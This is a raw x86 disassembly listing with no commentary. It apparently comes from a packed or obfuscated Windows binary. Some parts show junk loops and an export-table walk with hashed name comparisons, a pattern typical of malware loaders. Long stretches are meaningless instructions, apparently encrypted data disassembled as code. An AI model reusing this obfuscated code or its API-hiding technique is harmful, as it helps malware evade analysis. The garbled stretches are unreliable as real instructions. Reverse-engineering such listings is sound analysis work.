  4102cd:	mov    DWORD PTR ds:0x433623,ecx
  4102d3:	cmp    DWORD PTR ds:0x433623,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433623,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4335eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43362b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4335e3,0x433547
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433633,0x0
  410325:	mov    eax,ds:0x433633
  41032a:	inc    eax
  41032b:	mov    ds:0x433633,eax
  410330:	cmp    DWORD PTR ds:0x433633,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433633,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433633
  41035a:	inc    eax
  41035b:	mov    ds:0x433633,eax
  410360:	cmp    DWORD PTR ds:0x433633,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4335e3
  410379:	sbb    eax,DWORD PTR ds:0x433663
  41037f:	mov    ds:0x4335e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4335ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433567,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433547,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433547
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433547,eax
  4103c0:	cmp    DWORD PTR ds:0x433547,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433547,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433547,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433547
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433547,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433657,0x1e
  41040d:	cmp    DWORD PTR ds:0x433657,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433657,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433874
  41042f:	push   0x43355f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433657,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433657
  41044c:	dec    eax
  41044d:	mov    ds:0x433657,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433657
  41045a:	dec    eax
  41045b:	mov    ds:0x433657,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433657,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4335a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43359b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4335e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	mov    ecx,0x99a1f418
  4104c1:	mov    esi,0x7f127c7c
  4104c6:	jl     0x410544
  4104c8:	scas   al,BYTE PTR es:[edi]
  4104c9:	hlt    
  4104ca:	jae    0x4104a4
  4104cc:	enter  0xed81,0x1f
  4104d0:	xchg   edx,eax
  4104d1:	mov    ch,0x39
  4104d3:	stos   DWORD PTR es:[edi],eax
  4104d4:	mov    WORD PTR [ebx],ds
  4104d6:	cmp    BYTE PTR [edx+0x5dab01dc],bl
  4104dc:	dec    edi
  4104dd:	sbb    BYTE PTR [ebx-0x110bab15],ah
  4104e3:	and    dl,BYTE PTR [esi]
  4104e5:	pop    ebx
  4104e6:	jmp    0xcb0a5e33
  4104eb:	and    al,0xdc
  4104ed:	stos   BYTE PTR es:[edi],al
  4104ee:	cmp    DWORD PTR [edx],ecx
  4104f0:	int3   
  4104f1:	in     eax,dx
  4104f2:	mov    al,0x39
  4104f4:	fimul  WORD PTR [edi-0x2b]
  4104f7:	mov    ebp,0xb1bbb3a1
  4104fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104fd:	ins    DWORD PTR es:[edi],dx
  4104fe:	add    eax,0x817cb486
  410503:	and    DWORD PTR [esi-0x723512f3],ecx
  410509:	test   bl,dl
  41050b:	mul    DWORD PTR [ebx-0x61b11c0e]
  410511:	mov    al,ds:0xf60ba07d
  410516:	call   0x23dc9cba
  41051b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41051c:	(bad)  
  41051d:	push   edi
  41051e:	add    edi,DWORD PTR [ebp+0x5b0a8dfb]
  410524:	xchg   esp,eax
  410525:	add    esi,DWORD PTR [edx-0x66]
  410528:	cli    
  410529:	sub    BYTE PTR [edi],bh
  41052b:	aaa    
  41052c:	in     al,0xaa
  41052e:	sbb    BYTE PTR [esp+ebx*1-0x200c72d7],0x2
  410536:	and    BYTE PTR [ecx],bl
  410538:	loop   0x410589
  41053a:	arpl   dx,ax
  41053c:	shl    DWORD PTR gs:[ebx],1
  41053f:	(bad)  
  410540:	xor    DWORD PTR [esi],esp
  410542:	aas    
  410543:	or     al,0xb8
  410545:	loopne 0x4105bc
  410547:	xchg   DWORD PTR [eax-0x13051d90],esp
  41054d:	jb     0x4104dd
  41054f:	stos   DWORD PTR es:[edi],eax
  410550:	push   ds
  410551:	loop   0x410587
  410553:	push   ebp
  410554:	scas   eax,DWORD PTR es:[edi]
  410555:	adc    esi,DWORD PTR [ebp-0x63]
  410558:	inc    ebx
  410559:	jo     0x4105c1
  41055b:	shl    DWORD PTR [edx+ecx*2],cl
  41055e:	xchg   edx,eax
  41055f:	mov    edi,0x99ac509c
  410564:	xor    eax,0x57838922
  410569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056a:	xchg   ebp,eax
  41056b:	or     esi,DWORD PTR [ecx+0x434d8e21]
  410571:	int    0xc6
  410573:	xchg   DWORD PTR [ebp-0x3e139efa],esp
  410579:	fdiv   DWORD PTR [eax]
  41057b:	xor    DWORD PTR [ebx-0x9],esp
  41057e:	lahf   
  41057f:	das    
  410580:	jp     0x410574
  410582:	and    DWORD PTR [ecx-0x249a6e7d],ecx
  410588:	lds    esi,FWORD PTR [edx]
  41058a:	push   ecx
  41058b:	fiadd  WORD PTR [esi-0x3d]
  41058e:	cmp    al,0x6f
  410590:	out    dx,al
  410591:	pop    ecx
  410592:	jno    0x410529
  410594:	jle    0x41057f
  410596:	fst    DWORD PTR [ecx-0x3c851418]
  41059c:	fstp   DWORD PTR [edx]
  41059e:	out    0x84,eax
  4105a0:	mov    ds:0xa10d396d,al
  4105a5:	imul   DWORD PTR [esi]
  4105a7:	icebp  
  4105a8:	cmp    al,BYTE PTR [edi-0x16]
  4105ab:	and    dh,ch
  4105ad:	ss aas 
  4105af:	gs push 0x58
  4105b2:	sti    
  4105b3:	xchg   ebp,eax
  4105b4:	sbb    edi,DWORD PTR [ebx+edx*2-0x22b2aa7c]
  4105bb:	in     eax,0x7d
  4105bd:	retf   
  4105be:	sub    al,0xac
  4105c0:	sub    eax,0xa2c35a61
  4105c5:	push   ebp
  4105c6:	mov    ds:0x780f59ef,al
  4105cb:	mov    bl,al
  4105cd:	jl     0x4105e5
  4105cf:	test   DWORD PTR [esi+ecx*2+0x2d3445e6],eax
  4105d6:	inc    edi
  4105d7:	push   edi
  4105d8:	mov    ?,ecx
  4105da:	test   ch,dl
  4105dc:	cdq    
  4105dd:	or     DWORD PTR [edx+ebx*2-0x25890cdc],esi
  4105e4:	and    eax,0xfc458b5e
  4105e9:	sbb    DWORD PTR ds:0x4335d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43354f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43362f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43362f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4335df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x4105e8
  410648:	mov    al,0x19
  41064a:	inc    eax
  41064b:	mov    edi,0x127c7cb9
  410650:	jg     0x4106ce
  410652:	jl     0x41061f
  410654:	sub    eax,0x39726dd9
  410659:	xchg   edx,eax
  41065a:	cmp    DWORD PTR [edx-0x77],eax
  41065d:	outs   dx,BYTE PTR ds:[esi]
  41065e:	shl    BYTE PTR [ecx+0x47],0xbf
  410662:	ss jbe 0x410684
  410665:	mov    cl,0x54
  410667:	enter  0x7548,0x9a
  41066b:	div    dl
  41066d:	out    0xd4,eax
  41066f:	cwde   
  410670:	enterw 0x85d0,0x1b
  410675:	inc    ecx
  410676:	mov    ebx,0xfb018d1a
  41067b:	scas   al,BYTE PTR es:[edi]
  41067c:	or     al,0x15
  41067e:	mov    ds:0x1fb82aa9,eax
  410683:	out    0x1e,eax
  410685:	scas   eax,DWORD PTR es:[edi]
  410686:	(bad)  
  410687:	and    DWORD PTR [edi+0x4],eax
  41068a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068b:	inc    ebx
  41068c:	(bad)  
  41068d:	rcl    ebp,1
  41068f:	sti    
  410690:	inc    ecx
  410691:	int    0xd8
  410693:	(bad)  
  410694:	jle    0x4106b4
  410696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410697:	jmp    0x4f27:0x4e9f1a6c
  41069e:	and    al,0x3e
  4106a0:	mov    eax,ds:0xf85c2f76
  4106a5:	sbb    DWORD PTR [ebx],esi
  4106a7:	test   DWORD PTR [edx+0x2449e19],ebp
  4106ad:	xchg   ecx,eax
  4106ae:	cmp    al,0x17
  4106b0:	adc    eax,0x687a1d5d
  4106b5:	adc    eax,0x3bf1a22e
  4106ba:	inc    ebp
  4106bb:	test   al,0xd7
  4106bd:	in     al,0xa0
  4106bf:	hlt    
  4106c0:	out    0x2f,al
  4106c2:	xchg   edx,eax
  4106c3:	loopne 0x4106b7
  4106c5:	fimul  DWORD PTR [esi+0x8bba68d]
  4106cb:	into   
  4106cc:	call   0x9d86:0xc2e9f58a
  4106d3:	aas    
  4106d4:	or     eax,0x75502b7b
  4106d9:	retf   0xf1a0
  4106dc:	mov    ds:0x89d96a75,eax
  4106e1:	pop    esp
  4106e2:	int    0x97
  4106e4:	aaa    
  4106e5:	and    DWORD PTR [eax],0xffffffcd
  4106e8:	sub    cl,BYTE PTR [edi-0x9]
  4106eb:	jns    0x41069d
  4106ed:	in     eax,dx
  4106ee:	mov    ch,0x7b
  4106f0:	push   eax
  4106f1:	pop    esi
  4106f2:	les    esi,FWORD PTR [eax+0x4e]
  4106f5:	test   al,0xe7
  4106f7:	(bad)  
  4106f8:	fs xor edx,esp
  4106fb:	mov    eax,ds:0xea76925
  410700:	push   esi
  410701:	add    ah,dl
  410703:	lahf   
  410704:	out    0xd,eax
  410706:	mov    fs:0xd600e2b6,al
  41070c:	sar    DWORD PTR [esi+edi*8],1
  41070f:	inc    ebp
  410710:	cli    
  410711:	std    
  410712:	add    esi,DWORD PTR [eax-0x209d7d5d]
  410718:	push   ebp
  410719:	inc    ebp
  41071a:	sahf   
  41071b:	jge    0x4106fb
  41071d:	inc    eax
  41071e:	cmp    eax,0xa102319b
  410723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410724:	popa   
  410725:	pop    ds
  410726:	jge    0x4106d7
  410728:	or     al,0x38
  41072a:	cld    
  41072b:	cld    
  41072c:	icebp  
  41072d:	xchg   ebx,eax
  41072e:	or     al,0x80
  410730:	or     ch,al
  410732:	dec    ebx
  410733:	pop    es
  410734:	pop    ecx
  410735:	aad    0x1f
  410737:	mov    edi,0x2913b295
  41073c:	inc    edx
  41073d:	add    cl,dl
  41073f:	das    
  410740:	out    0x3d,eax
  410742:	jle    0x4107c0
  410744:	dec    ecx
  410745:	das    
  410746:	shl    DWORD PTR [ebx],0xa4
  410749:	retf   0x6031
  41074c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41074d:	fmul   DWORD PTR [ecx+esi*1+0x5aeb2a16]
  410754:	dec    edi
  410755:	outs   dx,DWORD PTR ds:[esi]
  410756:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  410758:	or     BYTE PTR [bx+si-0x2508],ch
  41075d:	sbb    DWORD PTR [ebp+ebp*1-0x4a6e6c20],esp
  410764:	push   eax
  410765:	sub    eax,0xe83f3e3f
  41076a:	sbb    eax,0x3af4002e
  41076f:	adc    dh,BYTE PTR ds:0x81ec4d8b
  410775:	add    eax,0x433567
  41077a:	mov    DWORD PTR [ecx],edi
  41077c:	add    BYTE PTR [eax],al
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433563,0x43354f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4335a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433663
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x1d88ac5a,eax
  4107e5:	sub    al,0x8a
  4107e7:	pop    ebp
  4107e8:	mov    eax,0x7f127c7c
  4107ed:	jl     0x41086b
  4107ef:	mov    edx,0xebe9835e
  4107f4:	xor    eax,0xd8aa7fd2
  4107f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107fa:	jno    0x4107fe
  4107fc:	or     DWORD PTR [ebx+0x4f],ebx
  4107ff:	mov    eax,0x5602c4cd
  410804:	sub    eax,0x539ac3e2
  410809:	pop    DWORD PTR [edi+ebp*4+0x65]
  41080d:	in     eax,dx
  41080e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41080f:	fadd   QWORD PTR es:[ebp-0x7c84b8bf]
  410816:	mov    ebx,0xc4f1cbeb
  41081b:	pop    eax
  41081c:	int3   
  41081d:	cwde   
  41081e:	adc    esi,DWORD PTR [eax+0x4cf8cc7d]
  410824:	push   esi
  410825:	jmp    0xa6bda41
  41082a:	mov    ds:0xd78fe11b,al
  41082f:	jo     0x410827
  410831:	call   DWORD PTR [edi]
  410833:	mov    dh,0xba
  410835:	mov    esi,0x746c476e
  41083a:	scas   al,BYTE PTR es:[edi]
  41083b:	push   esi
  41083c:	call   DWORD PTR [ebx+ebp*1+0x18d9da26]
  410843:	mov    ch,0xf1
  410845:	mov    dh,0x3f
  410847:	or     al,0x2a
  410849:	outs   dx,BYTE PTR ds:[esi]
  41084a:	daa    
  41084b:	test   esp,ecx
  41084d:	pop    eax
  41084e:	stos   DWORD PTR es:[edi],eax
  41084f:	or     bl,al
  410851:	pop    esp
  410852:	xor    eax,0x2c036fa4
  410857:	jle    0x4107fc
  410859:	aam    0x84
  41085b:	scas   al,BYTE PTR es:[edi]
  41085c:	add    al,0xce
  41085e:	xchg   BYTE PTR [esi],bh
  410860:	dec    eax
  410861:	aaa    
  410862:	mov    bh,0x3a
  410864:	sub    DWORD PTR [esi],eax
  410866:	jo     0x410860
  410868:	pushf  
  410869:	push   esi
  41086a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41086c:	dec    ebp
  41086d:	cmp    bh,BYTE PTR [edi]
  41086f:	arpl   WORD PTR [edx-0x16],dx
  410872:	leave  
  410873:	push   esp
  410874:	icebp  
  410875:	and    DWORD PTR [esi+0x31c40629],eax
  41087b:	jmp    0x410855
  41087d:	mov    ch,0xd2
  41087f:	add    BYTE PTR [ecx+0xf00d560],ch
  410885:	jno    0x4108c9
  410887:	lahf   
  410888:	dec    ecx
  410889:	mov    ebp,0xb00ec5bc
  41088e:	fst    st(7)
  410890:	mov    ebx,0xfc91406b
  410895:	sub    ah,BYTE PTR [edx-0x3]
  410898:	jae    0x4108ee
  41089a:	fnstenv [ebx-0x121858c1]
  4108a0:	ret    0x2fcf
  4108a3:	mov    es,WORD PTR [ebx-0x23495695]
  4108a9:	add    DWORD PTR [esi+edi*2],0xdac73cc2
  4108b0:	push   ebp
  4108b1:	rol    BYTE PTR [edi+0x5d],0x9b
  4108b5:	inc    edx
  4108b6:	mov    ah,0x23
  4108b8:	jl     0x410877
  4108ba:	dec    edx
  4108bb:	mov    ebx,0xad203fd0
  4108c0:	inc    esi
  4108c1:	jbe    0x4108ab
  4108c3:	sub    ebp,esi
  4108c5:	mov    ah,0x9e
  4108c7:	xlat   BYTE PTR ds:[ebx]
  4108c8:	add    DWORD PTR [ebx-0x3f9ff46c],0x6f543996
  4108d2:	ret    
  4108d3:	adc    al,0x68
  4108d5:	out    0x82,al
  4108d7:	inc    ebx
  4108d8:	stos   BYTE PTR es:[edi],al
  4108d9:	inc    esp
  4108da:	mov    esp,0x6e999c77
  4108df:	sbb    dh,0xb
  4108e2:	aad    0x59
  4108e4:	mov    al,0x76
  4108e6:	(bad)  
  4108e7:	in     al,0xaf
  4108e9:	jmp    0x9772:0x5865731a
  4108f0:	outs   dx,BYTE PTR ds:[esi]
  4108f1:	inc    ecx
  4108f2:	mov    ds:0xe7aa55b5,al
  4108f7:	cmc    
  4108f8:	cmp    ch,BYTE PTR [esi+0x6d6a8d77]
  4108fe:	sub    BYTE PTR [edi+0x1f],dl
  410901:	mov    dl,0xa3
  410903:	pop    esp
  410904:	ins    DWORD PTR es:[edi],dx
  410905:	std    
  410906:	loop   0x410969
  410908:	pop    edi
  410909:	inc    ebx
  41090a:	dec    ebp
  41090b:	das    
  41090c:	ror    DWORD PTR [ebx+0xc03084d],cl
  410912:	mov    eax,0x89f8458d
  410917:	dec    ebp
  410918:	rcl    BYTE PTR [eax-0x1],1
  41091b:	jne    0x4108ed
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [eax],dh
  41099e:	jg     0x410945
  4109a0:	int    0x73
  4109a2:	mov    ebx,0x7f127c7c
  4109a7:	jl     0x410a25
  4109a9:	retf   
  4109aa:	cdq    
  4109ab:	pop    edi
  4109ac:	pusha  
  4109ad:	and    dl,ah
  4109af:	cmp    ch,BYTE PTR [edi+0x94ce6f]
  4109b5:	and    dl,ah
  4109b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109b8:	mov    edx,0x660d1102
  4109bd:	fdiv   QWORD PTR [ebx]
  4109bf:	pusha  
  4109c0:	push   edi
  4109c1:	add    cl,BYTE PTR [ebx]
  4109c3:	pop    es
  4109c4:	mov    esp,ss
  4109c6:	(bad)  
  4109c8:	in     eax,dx
  4109c9:	jle    0x4109ff
  4109cb:	mov    DWORD PTR [edx],edi
  4109cd:	mov    ecx,ebp
  4109cf:	inc    ebx
  4109d0:	and    BYTE PTR [edx],bl
  4109d2:	and    eax,0x884aefb
  4109d7:	adc    ebx,DWORD PTR [ebp+0x6d]
  4109da:	bound  ebx,QWORD PTR [eax-0x41259eb1]
  4109e0:	add    al,0xf2
  4109e2:	lods   eax,DWORD PTR ds:[esi]
  4109e3:	aad    0x78
  4109e5:	lods   eax,DWORD PTR ds:[esi]
  4109e6:	cmp    BYTE PTR [ecx],bl
  4109e8:	ja     0x4109e5
  4109ea:	mov    eax,ds:0x1bb1ec7
  4109ef:	sbb    ah,BYTE PTR [ecx]
  4109f1:	dec    edx
  4109f2:	dec    ecx
  4109f3:	clc    
  4109f4:	mov    eax,0x5ff0fff1
  4109f9:	gs (bad) 
  4109fb:	das    
  4109fc:	xchg   ebp,eax
  4109fd:	sub    ebp,esp
  4109ff:	jle    0x410984
  410a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a02:	mov    esp,0xc8c99bd3
  410a07:	jg     0x410a86
  410a09:	sbb    eax,edx
  410a0b:	(bad)  
  410a0c:	outs   dx,BYTE PTR ds:[esi]
  410a0d:	idiv   BYTE PTR [edi-0x3b]
  410a10:	(bad)  
  410a11:	ds retf 0xa733
  410a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a16:	fwait
  410a17:	ds xchg edi,eax
  410a19:	jl     0x410a44
  410a1b:	inc    esp
  410a1c:	mov    ds:0x32e52d50,al
  410a21:	ins    DWORD PTR es:[edi],dx
  410a22:	cmp    eax,0xd3670a7f
  410a27:	cli    
  410a28:	pusha  
  410a29:	xor    bh,BYTE PTR [edx+0x60743e3c]
  410a2f:	inc    ebp
  410a30:	arpl   WORD PTR [ecx-0x6f],sp
  410a33:	shl    ebp,cl
  410a35:	xchg   ecx,eax
  410a37:	lea    ebx,[ebp+0x5b736942]
  410a3d:	adc    al,0x69
  410a3f:	xor    al,BYTE PTR [eax]
  410a41:	push   ebx
  410a42:	retf   
  410a43:	inc    eax
  410a44:	cmp    eax,0xf5a8d9fa
  410a49:	imul   eax,edi,0xce6275cc
  410a4f:	retf   
  410a50:	xchg   esp,eax
  410a51:	xchg   edx,eax
  410a52:	fimul  DWORD PTR [edi-0x69cfd6a1]
  410a58:	popf   
  410a59:	mov    eax,0x430d2227
  410a5e:	pop    ebx
  410a5f:	cmp    ch,BYTE PTR [ecx+0x65]
  410a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a63:	lds    edx,FWORD PTR [esi-0x1a8a17ed]
  410a69:	push   cs
  410a6a:	sub    DWORD PTR [eax-0x5035d031],edi
  410a70:	aaa    
  410a71:	xor    eax,0x1f2d1f37
  410a76:	or     BYTE PTR ds:0x910eec81,0xf7
  410a7d:	xor    bh,BYTE PTR [edi-0x5259e7e8]
  410a83:	jb     0x410a26
  410a85:	mov    esp,0xd71e30cc
  410a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a8b:	test   DWORD PTR [ebp+0x5a],edx
  410a8e:	pop    edi
  410a8f:	es cmp eax,0xb7dbb9d8
  410a95:	in     al,0xd2
  410a97:	mul    edi
  410a99:	xchg   ebp,eax
  410a9a:	cs jno 0x410ae9
  410a9d:	or     al,0x65
  410a9f:	out    0x54,eax
  410aa1:	pop    ebp
  410aa2:	scas   al,BYTE PTR es:[edi]
  410aa3:	push   edi
  410aa4:	cld    
  410aa5:	ins    DWORD PTR es:[edi],dx
  410aa6:	cmp    ch,ch
  410aa8:	shr    BYTE PTR [edx-0x55],cl
  410aab:	ds in  eax,0x9c
  410aae:	mov    ds:0xca6da8cd,al
  410ab3:	rol    BYTE PTR [ebx-0x70],1
  410ab6:	or     al,0x2e
  410ab8:	sub    BYTE PTR [edi],ch
  410aba:	cmp    cl,dl
  410abc:	imul   edx,DWORD PTR [edx+ebp*1-0x6b],0xffffff8a
  410ac1:	mov    bl,0xd2
  410ac3:	pop    esi
  410ac4:	jmp    0x8908:0x4503a837
  410acb:	inc    ebp
  410acc:	lock mov eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fcom   QWORD PTR [edx+0x27]
  410af3:	shl    esp,1
  410af5:	adc    DWORD PTR [ebp+0x7c],eax
  410af8:	jl     0x410b0c
  410afa:	jg     0x410b78
  410afc:	jl     0x410b24
  410afe:	imul   edx,DWORD PTR [ebp-0x4b95b9b4],0x13
  410b05:	sti    
  410b06:	retf   
  410b07:	push   0x56cf233b
  410b0c:	cmp    al,0x10
  410b0e:	mov    bh,0xc6
  410b10:	jno    0x410adb
  410b12:	mov    esp,0x3e2101fe
  410b17:	jl     0x410ada
  410b19:	pop    ss
  410b1a:	xchg   edi,eax
  410b1b:	xchg   edx,eax
  410b1c:	jp     0x410ae5
  410b1e:	xchg   dl,ah
  410b20:	jae    0x410b3e
  410b22:	outs   dx,DWORD PTR ds:[esi]
  410b23:	jbe    0x410b86
  410b25:	popf   
  410b26:	add    al,0xd8
  410b28:	bound  eax,QWORD PTR [edi+0x23]
  410b2b:	int3   
  410b2c:	push   esi
  410b2d:	and    dh,BYTE PTR [ebp-0x3a]
  410b30:	nop
  410b31:	mov    ah,0xf
  410b33:	pusha  
  410b34:	inc    edx
  410b35:	nop
  410b36:	(bad)  
  410b37:	imul   ebp,DWORD PTR [edx+0x1c],0xffffffd6
  410b3b:	shl    DWORD PTR [eax-0x57],0xb
  410b3f:	sbb    DWORD PTR [esi-0x537dc4f],esi
  410b45:	xlat   BYTE PTR ds:[ebx]
  410b46:	(bad)  
  410b47:	and    eax,ebx
  410b49:	jne    0x410b42
  410b4b:	imul   BYTE PTR [edx]
  410b4d:	lds    edx,FWORD PTR [ecx+0x5e]
  410b50:	repnz adc al,0xa1
  410b53:	fldenv ds:0x77fc0055
  410b59:	test   BYTE PTR [ebp+0x234b17de],cl
  410b5f:	ins    DWORD PTR es:[edi],dx
  410b60:	add    ebp,esp
  410b62:	xchg   ebx,eax
  410b63:	inc    esi
  410b64:	sub    cl,ch
  410b66:	push   es
  410b67:	adc    ebp,DWORD PTR [ecx-0x6]
  410b6a:	mov    edi,0x34196782
  410b6f:	(bad)  
  410b70:	dec    eax
  410b71:	iret   
  410b72:	lds    ebp,FWORD PTR [edx-0x2fdbbcd1]
  410b78:	shr    DWORD PTR [edx],cl
  410b7a:	ds jmp 0xaa03e670
  410b80:	stos   BYTE PTR es:[edi],al
  410b81:	jge    0x410b0c
  410b83:	cmp    esp,DWORD PTR [ecx]
  410b85:	sub    ecx,DWORD PTR [ebp-0x16664b11]
